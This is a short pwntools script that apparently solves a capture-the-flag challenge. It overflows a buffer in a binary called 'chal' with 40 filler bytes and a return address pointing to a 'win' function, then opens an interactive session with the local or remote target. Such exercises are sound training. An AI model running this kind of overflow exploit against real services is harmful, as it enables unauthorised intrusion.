from pwn import *
import sys


context.binary = elf = ELF('./chal')
context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) > 1 else None
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else None

def start():
    if HOST and PORT:
        return remote(HOST, PORT)
    return process('./chal')

p = start()

win = 0x4011f6

payload  = b'A' * 40
payload += p64(win)

p.recvuntil(b'Helo who ar yo?')
p.sendline(payload)

p.interactive()
